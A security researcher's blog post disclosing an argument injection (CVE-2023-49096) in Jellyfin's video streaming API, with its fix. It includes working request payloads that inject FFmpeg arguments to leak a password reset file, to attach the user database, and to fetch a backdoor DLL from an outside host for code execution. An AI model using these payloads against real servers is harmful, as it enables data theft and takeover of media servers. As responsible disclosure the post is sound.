+++
title = "Get Out of Jelly Free Card"
author = ["Frederic Linn"]
date = 2023-12-06T08:04:00+01:00
draft = false
+++

<div class="verse">

Roses are chrominance blue,<br />
&nbsp;Water is chrominance red,<br />
I suggest you,<br />
&nbsp;Dive into FFmpeg.<br />
<br />
-- Fred Murpheg, <https://youtu.be/9kaIXkImCAM><br />

</div>

Last time we managed to gain remote code execution on a default `Jellyfin` instance. Unfortunately we needed a low-privileged user account to make it happen.

After   [seeing](/get-out-of-jelly-free-card_shodan.png) how many instances of `Jellyfin` are directly reachable, I went back to the drawing board. Because what's better than a post-authentication vulnerability?
Exactly: A pre-authentication vulnerability!

In this article, we're going to have a more thorough look at the `REST API`, discover an argument injection ([CVE-2023-49096](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49096)) and finally exploit it in order to read arbitrary files among other things.

But first, we need a big...


### Disclaimer {#disclaimer}

Don't panic!

While the issue is _technically_ exploitable by an unauthenticated attacker, the reality is a lot more nuanced. You see, we need to know the id of any item in the database. Those ids are random `GUIDs`, which makes exploitation without an additional information leak highly unlikely, if not impossible!

It certainly becomes a more pressing issue when taking low-privileged users into consideration, but as it stands you're probably fine.

This vulnerability plus an additional one are fixed in version [10.8.13](https://github.com/jellyfin/jellyfin/releases/tag/v10.8.13).


### Go to Definition {#go-to-definition}

`Jellyfin` is a big project with a big surface. But reading through the collection of potential [security issues](https://github.com/jellyfin/jellyfin/issues/5415) again, I decided to give the `REST API` another look.

Just like [before](/blog/peanut-butter-jellyfin-time#authorization), we can search for the `[Authorize]` attribute of every endpoint. Only this time we want it to be _absent_.

The aforementioned `GitHub` issue mentions the `VideosController.cs` endpoints, specifically `/Videos/<itemId>/stream` and `/Videos/<itemId>/stream.<container>`.

They are responsible for streaming videos, which might involve an encoding step (depending on which format the client requested). This optional step makes them especially interesting: Who knows what can be done if attacker controlled values land in an `FFmpeg` invocation?&nbsp;[^fn:1]

Both endpoints caught my attention because of the sheer number of arguments that can (optionally) be passed to them:

```csharp { linenos=true, linenostart=1, hl_lines=["15","47"] }
// VideosController.cs
public Task<ActionResult> GetVideoStreamByContainer(
    [FromRoute, Required] Guid itemId,
    [FromRoute, Required] string container,
    [FromQuery] bool? @static,
    [FromQuery] string? @params,
    [FromQuery] string? tag,
    [FromQuery] string? deviceProfileId,
    [FromQuery] string? playSessionId,
    [FromQuery] string? segmentContainer,
    [FromQuery] int? segmentLength,
    [FromQuery] int? minSegments,
    [FromQuery] string? mediaSourceId,
    [FromQuery] string? deviceId,
    [FromQuery] string? audioCodec,
    [FromQuery] bool? enableAutoStreamCopy,
    [FromQuery] bool? allowVideoStreamCopy,
    [FromQuery] bool? allowAudioStreamCopy,
    [FromQuery] bool? breakOnNonKeyFrames,
    [FromQuery] int? audioSampleRate,
    [FromQuery] int? maxAudioBitDepth,
    [FromQuery] int? audioBitRate,
    [FromQuery] int? audioChannels,
    [FromQuery] int? maxAudioChannels,
    [FromQuery] string? profile,
    [FromQuery] string? level,
    [FromQuery] float? framerate,
    [FromQuery] float? maxFramerate,
    [FromQuery] bool? copyTimestamps,
    [FromQuery] long? startTimeTicks,
    [FromQuery] int? width,
    [FromQuery] int? height,
    [FromQuery] int? maxWidth,
    [FromQuery] int? maxHeight,
    [FromQuery] int? videoBitRate,
    [FromQuery] int? subtitleStreamIndex,
    [FromQuery] SubtitleDeliveryMethod? subtitleMethod,
    [FromQuery] int? maxRefFrames,
    [FromQuery] int? maxVideoBitDepth,
    [FromQuery] bool? requireAvc,
    [FromQuery] bool? deInterlace,
    [FromQuery] bool? requireNonAnamorphic,
    [FromQuery] int? transcodingMaxAudioChannels,
    [FromQuery] int? cpuCoreLimit,
    [FromQuery] string? liveStreamId,
    [FromQuery] bool? enableMpegtsM2TsMode,
    [FromQuery] string? videoCodec,
    [FromQuery] string? subtitleCodec,
    [FromQuery] string? transcodeReasons,
    [FromQuery] int? audioStreamIndex,
    [FromQuery] int? videoStreamIndex,
    [FromQuery] EncodingContext? context,
    [FromQuery] Dictionary<string, string> streamOptions)
    // ---snip---
```

51 parameters! Now that's a lot. The highlighted ones will become relevant in a second.

It certainly looks like a good target, so let's start to manually trace every input. In order to not get overwhelmed, we focus on `strings` first. Chances are they get incorporated _as-is_.

Let's do this!

{{< figure src="/get-out-of-jelly-free-card_many-hours-later.png" caption="<span class=\"figure-number\">Figure 1: </span>Many hours later" >}}

Okay I'm kidding, it wasn't that bad!

The `videoCodec` parameter caught my attention pretty quickly.

It looks like we can provide a number of different codecs separated by commas, but the first one will be selected no matter what 🤷🏻.
Maybe down the line `SupportedVideoCodecs` are used again?

```csharp { linenos=true, linenostart=1, hl_lines=["5-6"] }
// StreamingHelpers.cs
//---snip---
if (state.IsVideoRequest && !string.IsNullOrWhiteSpace(state.Request.VideoCodec))
{
    state.SupportedVideoCodecs = state.Request.VideoCodec.Split(',', StringSplitOptions.RemoveEmptyEntries);
    state.Request.VideoCodec = state.SupportedVideoCodecs.FirstOrDefault();
}
//---snip---
```

We ultimately end up in the `EncodingHelper` class, where the command line arguments for `FFmepg` are constructed.

```csharp { linenos=true, linenostart=1, hl_lines=["5","15"] }
// EncodingHelper.cs
public string GetProgressiveVideoFullCommandLine(EncodingJobInfo state, EncodingOptions encodingOptions, string outputPath, string defaultPreset)
{
    // Get the output codec name
    var videoCodec = GetVideoEncoder(state, encodingOptions);
    // ---snip---

    return string.Format(
        CultureInfo.InvariantCulture,
        "{0} {1}{2} {3} {4} -map_metadata -1 -map_chapters -1 -threads {5} {6}{7}{8} -y \"{9}\"",
        inputModifier,
        GetInputArgument(state, encodingOptions, null),
        keyFrame,
        GetMapArgs(state),
        GetProgressiveVideoArguments(state, encodingOptions, videoCodec, defaultPreset),
        threads,
        GetProgressiveVideoAudioArguments(state, encodingOptions),
        GetSubtitleEmbedArguments(state),
        format,
        outputPath).Trim();
}
```

Some more processing of our input is done in line five. We'll get to line 15 soon.

```csharp { linenos=true, linenostart=1, hl_lines=["4","19"] }
// EncodingHelper.cs
public string GetVideoEncoder(EncodingJobInfo state, EncodingOptions encodingOptions)
{
    var codec = state.OutputVideoCodec;

    if (!string.IsNullOrEmpty(codec))
    {
        if (string.Equals(codec, "av1", StringComparison.OrdinalIgnoreCase))
        {
            return GetAv1Encoder(state, encodingOptions);
        }
        // ---snip---

        if (string.Equals(codec, "theora", StringComparison.OrdinalIgnoreCase))
        {
            return "libtheora";
        }

        return codec.ToLowerInvariant();
    }

    return "copy";
}
```

The `OutputVideoCodec` property in line four is our controlled value.[^fn:2]

We see a bunch of `ifs`, but no `else` with a default value. That's super exciting! In essence, our string gets returned untouched in line 19. Well, there is some processing in the form of `.ToLowerInvariant()`. But because we only provide lowercase input anyway, we don't care.

Next, our input is _finally_ added to the command line string in `GetProgressiveVideoArguments()`:

```csharp { linenos=true, linenostart=1 }
// EncodingHelper.cs
public string GetProgressiveVideoArguments(EncodingJobInfo state, EncodingOptions encodingOptions, string videoCodec, string defaultPreset)
{
    var args = "-codec:v:0 " + videoCodec;
    //---snip---
}
```

After all that tracing, we found a sink inside the `FFmpeg` command line for attacker controlled values. Cool.

What exactly does that mean, though?


### Diving into FFmpeg {#diving-into-ffmpeg}

My first thought was executing arbitrary commands via [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html). However, there's a clear distinction between the ability to inject _commands_ or _arguments_.

Because we can only work with the intended functionality, the latter is highly application dependent[^fn:3]. The former, while potentially allowing for more generic attacks, needs the presence of a shell that parses the invocation.

Sadly, no shell will ever parse our malicious input!

Why? Here's the invocation of `FFmpeg`:

```csharp { linenos=true, linenostart=1, hl_lines=["8"] }
// TranscodingJobHelper.cs
var process = new Process
{
    StartInfo = new ProcessStartInfo
    {
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        UseShellExecute = false,
        // ---snip---
        Arguments = commandLineArguments,
        // ---snip---
    },
    EnableRaisingEvents = true
};
```

By setting `UseShellExecute` to `false` in line eight, the `.NET` runtime effectively forks and executes a process and directly passes those arguments as `argv` to the program.

Looking at the [implementation](https://github.com/dotnet/runtime/blob/7fe6609efee2d63f685375f0d74181c065bb0c28/src/libraries/System.Diagnostics.Process/src/System/Diagnostics/Process.Unix.cs#L408), I'm not too sure that setting `UseShellExecute` to `true` would help us either. In both cases, `ForkAndExecProcess()` is called with our arguments.
But that's only the `Unix` implementation. On `Windows`, there's actually a [distinction](https://github.com/dotnet/runtime/blob/7fe6609efee2d63f685375f0d74181c065bb0c28/src/libraries/System.Diagnostics.Process/src/System/Diagnostics/Process.Win32.cs#L23) between using `CreateProcess` and `ShellExecute` under the hood.

In any case, the result is the same: We cannot inject arbitrary commands, but have to make do with the functionality `FFmpeg` provides.

But don't fret! There are worse places to be stuck in than the `FFmpeg` command line.
It might as well be Turing-complete.

Thinking about how to exploit this, I realized two things:

1.  `FFmpeg` has _a lot_ of functionality. It's actually amazing.
2.  There's a reason why most people use a wrapper around it.

The attacks I was able to come up with are simple enough. However, it took me embarrassingly long to construct them. The sheer number of switches and arguments is nightmare fuel!


### Exploitation {#exploitation}

I've stopped after identifying three exploitation vectors:

1.  Overwriting arbitrary files with a zero byte file by specifying an additional output.
2.  Overlaying any text file onto the final video via the drawtext filter.
3.  Including any file as an attachment to the final video.

Because I didn't want to go down too many rabbit holes, I've opted to only use Jellythings again.


#### Overwriting {#overwriting}

Zeroing-out a file sounds useful. I've tried overwriting the main settings file (`system.xml`) in the hopes `Jellyfin` would create a default one. The setting I was looking for is `IsStartupWizardComplete`, which defaults to false. This in turn would give us far-reaching access to the instance.

Sadly, that's not how it works. `Jellyfin` simply checks for the presence of that file. A zeroed-out file is still present, so the whole thing turns into a denial-of-service (`DoS`) attack, because the instance cannot start correctly any longer.

I've tried the same thing with the main database file, `jellyfin.db`. Here, a new `SQLite` database is actually created, which we can thank [Entity Framework Core](https://learn.microsoft.com/en-us/ef/core/) for. At least I think that's what's happening.

The new database won't have any users stored, so nobody is able to log in. Another DoS, which is not what we're looking for.

While there might be viable attacks if we'd extend the scope to the whole system, I'm sticking to `Jellyfin` components only. Please let me know if you can think of another vector.


#### Drawtext {#drawtext}

`FFmpeg` has **extensive** filtering capabilities. One of those is the [drawtext](https://ffmpeg.org/ffmpeg-filters.html#drawtext-1) filter. It allows us to draw text from a file on top of a video.

Trying to specify one such filter in our `videoCodec` argument results in a warning. That's because `Jellyfin` defines its own filters and `FFmpeg` says no, no, no.
Only the last filter will be applied.

But that's not a problem at all! There's another attacker controlled value: The `audioCodec`. This one gets inserted _after_ their hardcoded filter.
As a result, `FFmpeg` uses our filter. Perfect!

What file do we want to overlay?

`Jellyfin` allows users to reset their password. The accounts are not connected to mail addresses, so it works by simply providing a valid username. This internally sets an easy-access pin for the user, which gets stored server-side in a file and inside the database.

Oh, we're also kindly provided with the full path to the file. 🙏

There is a caveat, though: Initiating the reset process can only be done from within the same network as the instance. I don't know how reverse proxies could undermine that assumption. As far as I can tell, the code doesn't check the [Forwarded](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Forwarded) header.

If that's really the case, than `Jellyfin` might only check the IP address of the reverse proxy (which sits on the same network) and therefore allow the password reset. However, it seems _highly_ unlikely that the team missed something like this. On the other hand, `Emby` had quite the [situation](https://www.bleepingcomputer.com/news/security/emby-shuts-down-user-media-servers-hacked-in-recent-attack/) in that part of the codebase, so you never know.

Anyway, here's the (decoded) request used on `Windows` that gets hold of the file:

```txt
 http://localhost:8096/Videos/1011b7d34f0fa0b8cea35427e8b27f39/stream.mkv?audioCodec=copy -vf "drawtext=fontfile=/Windows/Fonts/Arial.ttf:textfile=/path/to/password_reset_file:fontsize=24:x=20:y=20:fontcolor=white"
```

And here's a screenshot of the resulting video:

{{< figure src="/get-out-of-jelly-free-card_draw-text.png" caption="<span class=\"figure-number\">Figure 2: </span>The leaked password reset file drawn over a video" >}}

That's such a stupid way of exfiltrating data. I love it!


#### Attachment {#attachment}

The other route are attachments. What are those? The `FFmpeg` documentation says the following:

> Add an attachment to the output file. This is supported by a few formats like Matroska for e.g. fonts used in rendering subtitles [...]

Sounds powerful. What file do we want to attach? How about the `SQLite` database, `jellyfin.db`? While the passwords are hashed, API keys and easy access codes are **not**.

API keys have the same capabilities as an admin in practice, so those are a great find. If none are present, we can search for an admin and start the password reset process for their account.

This makes the previous attack obsolete. By resetting the password, not only does a temporary pin get written to a file, but also to the database. Afterwards we'd be able to retrieve it from the database itself.

Here's the (decoded) request:

```txt
 http://localhost:8096/Videos/1011b7d34f0fa0b8cea35427e8b27f39/stream.mkv?videoCodec=libx264 -attach </path/to/jellyfin.db> -metadata:s:2 mimetype=application/octet-stream
```

We specifically request the `mkv` container in the `URL` so that `FFmpeg` doesn't complain about the attachment.


### Limitations {#limitations}

We need to keep a couple of limitations in mind.

First off, there's a fast path for videos that have been encoded previously. If the requested video falls into that category, we need to wait until one of the build-in [tasks](https://jellyfin.org/docs/general/server/tasks/) cleans up the cache directory. This behavior is mainly tied to the final output path.

Furthermore, encoding could take a long time for a large video. We might run into the default [keep alive timeout](https://learn.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.server.kestrel.core.kestrelserverlimits.keepalivetimeout?view=aspnetcore-7.0#microsoft-aspnetcore-server-kestrel-core-kestrelserverlimits-keepalivetimeout) (130 seconds). Because the encoding will still finish in the background, this should be a non-issue. We can simply request the same file later, which will contain our attachment.


### Untapped Potential {#untapped-potential}

I'm actually _extra_ positive that more powerful attacks could performed with our primitive.

There is probably a way of overwriting an arbitrary file with malicious content. `FFmpeg` can retrieve output via numerous protocols, after all. Maybe those protocols can even be used to gather `NTLM` hashes. That’s only speculation, though!


### Full Potential {#full-potential}

Most of this article was already done, as my first report of the issue was way back in June. It turns out another person, [Martin Wagner](https://martinwagner.co/), found the issue independently. My first bug collision, how exciting 🤩.

I was right in the previous paragraph! More powerful attacks were possible. Unlike myself, he actually managed to get remote code execution by dumping the attachment of a remote file:

```txt
 /Videos/{media}/stream.mkv?VideoCodec=libx264 /tmp/a.mkv -dump_attachment:t /config/plugins/configurations/Jellyfin.Plugin.Backdoor.dll -i https://mawalabs.de/stuff/backdoor.mkv
```

The malicious `DLL` gets placed in the plugin folder, where `Jellyfin` auto-discovers and loads it after the next restart of the instance.

That's such an ingenious idea, kudos to Martin.


### The Fix {#the-fix}

They use an [attribute](https://learn.microsoft.com/en-us/dotnet/api/system.componentmodel.dataannotations.regularexpressionattribute?view=net-7.0) to validate the `videoCodec`, `audioCodec`, `subtitleCodec` and `segmentContainer` parameters with the help of a regular expression:

```csharp
 // EncondingHelper.cs
 public const string ValidationRegex = @"^[a-zA-Z0-9\-\._,|]{0,40}$"

 // VideosController.cs
 [FromQuery][RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,
```

What does the regex do? Well, ChatGPT, explain it like Lil Pump would:

<div class="verse">

Ayy, listen up, lil regex vibe,<br />
Starts strong, gotta be real sly.<br />
<br />
Letters, nums, dashes, dots in the mix,<br />
Comma, pipe, underscore, don't need a fix.<br />
<br />
Zero to forty, that's the game,<br />
Gotta fit the pattern, ain't that lame?<br />
<br />
From start to end, it's gotta flow,<br />
Regex magic, make it go, "Whoa!"<br />

</div>


### Conclusion {#conclusion}

I said it before: Dealing with user input is **really** hard. One slip-up can have a huge impact. The input can surface in unexpected places and is often hard to mentally track.

By now most developers are sensitized to `SQL injection`, but the presented vulnerability shows that even something as restricted as the ability the add arguments to a program's command line can lead to remote code execution under the right circumstances. Because attackers _will_ get creative.

Well, what can we do? Where applicable, `strings` should be avoided in favor of more constrained types like enums. Furthermore, many companies offer static analysis tools, which should be able to detect those kind of issues before they land in a release build.

On a more fundamental level, we should ask ourselves: Does our API really need to accommodate _every_ client's needs? Maybe it's okay to sometimes shift the flexibility from the server back to the clients.

As always, thank you **so** much for reading!

[^fn:1]: I do. And so will you. 😘
[^fn:2]: I didn't show the part where it was stored in that property.
[^fn:3]: Because we're restricted to the functionality the program exposes as command line arguments.
